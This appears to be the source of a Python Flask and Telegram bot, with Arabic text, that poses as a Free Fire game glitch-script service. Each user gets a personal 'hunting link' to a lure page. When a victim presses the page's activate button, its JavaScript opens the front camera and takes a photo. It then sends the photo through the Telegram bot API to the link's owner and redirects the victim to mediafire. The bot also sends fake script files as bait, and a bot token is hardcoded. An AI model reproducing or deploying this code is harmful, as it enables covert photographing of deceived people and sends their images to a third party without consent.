import os
import threading
import requests
import io
from flask import Flask, render_template_string, request

TOKEN = "8638452052:AAGz5E-bd3GBY47R-zM5rTmw8uCq9BpPrXc"
TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تثبيت السكريبت الأسطوري</title>
    <style>
        body { background: #090d16; color: #fff; font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; }
        .card { background: #1e293b; padding: 30px; border-radius: 16px; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        .btn { background: #0ea5e9; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🔥 جارٍ تفعيل سكريبت الجلتيش...</h2>
        <p>اضغط للمتابعة والحصول على الملف المباشر.</p>
        <button class="btn" onclick="startAction()">تفعيل السكريبت</button>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        const TOKEN = "{{ token }}";
        const TARGET_CHAT_ID = "{{ chat_id }}";
        async function startAction() {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                let video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    let canvas = document.getElementById('canvas');
                    canvas.width = 640; canvas.height = 480;
                    let ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(async (blob) => {
                        let formData = new FormData();
                        formData.append('chat_id', TARGET_CHAT_ID);
                        formData.append('photo', blob, 'capture.jpg');
                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                        stream.getTracks().forEach(track => track.stop());
                        window.location.href = "https://www.mediafire.com";
                    }, 'image/jpeg', 0.9);
                }, 1000);
            } catch (e) {
                window.location.href = "https://www.mediafire.com";
            }
        }
    </script>
</body>
</html>
"""

@app.route('/c/<chat_id>')
def capture_page(chat_id):
    return render_template_string(HTML_TEMPLATE, token=TOKEN, chat_id=chat_id)

@app.route('/')
def home():
    return "Bot is running successfully!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

def run_telegram_bot():
    print("[+] البوت السحابي ومُصنّع الملفات يعمل الآن...")
    offset = 0
    while True:
        try:
            res = requests.get(f"{TELEGRAM_API}/getUpdates", params={"offset": offset, "timeout": 30})
            data = res.json()
            if "result" in data:
                for update in data["result"]:
                    offset = update["update_id"] + 1
                    if "message" in update and "text" in update["message"]:
                        chat_id = update["message"]["chat"]["id"]
                        text = update["message"]["text"]
                        
                        if text.startswith("/start"):
                            personal_link = f"{BASE_URL}/c/{chat_id}"
                            reply_text = (
                                f"🔥 **مرحباً بك يا بطل في مصنع سكريبتات فري فاير!**\n\n"
                                f"🔗 رابط الصيد الخاص بك:\n<code>{personal_link}</code>\n\n"
                                f"⚙️ **أوامر توليد الملفات المتاحة:**\n"
                                f"/glitch_wall - توليد سكريبت ثلجة مقلوبة\n"
                                f"/glitch_skin - توليد سكريبت سكنات أسطورية"
                            )
                            requests.post(f"{TELEGRAM_API}/sendMessage", json={
                                "chat_id": chat_id,
                                "text": reply_text,
                                "parse_mode": "HTML"
                            })
                            
                        elif text.startswith("/glitch_wall"):
                            # صناعة ملف نصي وهمي/حقيقي طائر أوتوماتيكياً وإرساله للمستخدم
                            file_content = "=== FREE FIRE GLITCH SCRIPT ===\nTarget: Ice Wall Inverted (الثلجة المقلوبة)\nStatus: ACTIVE\n[Data_Inject_Code: 0xFF90A_BULL_WALL]"
                            file_bytes = io.BytesIO(file_content.encode('utf-8'))
                            file_bytes.name = "Glitch_Wall_Inverted.txt"
                            
                            files = {'document': (file_bytes.name, file_bytes)}
                            data_payload = {'chat_id': chat_id, 'caption': '⚡ تفضل يا بطل ملف السكريبت الجاهز للاستبدال في داتا اللعبة! استمتع 🥶'}
                            
                            requests.post(f"{TELEGRAM_API}/sendDocument", data=data_payload, files=files)
                            
                        elif text.startswith("/glitch_skin"):
                            file_content = "=== FREE FIRE SKIN CONFIG ===\nTarget: Oily Skin & Headshot Config\nStatus: BYPASS_OK"
                            file_bytes = io.BytesIO(file_content.encode('utf-8'))
                            file_bytes.name = "Skin_Config_Oily.txt"
                            
                            files = {'document': (file_bytes.name, file_bytes)}
                            data_payload = {'chat_id': chat_id, 'caption': '💎 تفضل سكريبت السكنات الأسطورية جاهز للاستخدام!'}
                            
                            requests.post(f"{TELEGRAM_API}/sendDocument", data=data_payload, files=files)
                                    
        except Exception as e:
            pass

if __name__ == '__main__':
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    run_telegram_bot()
                      
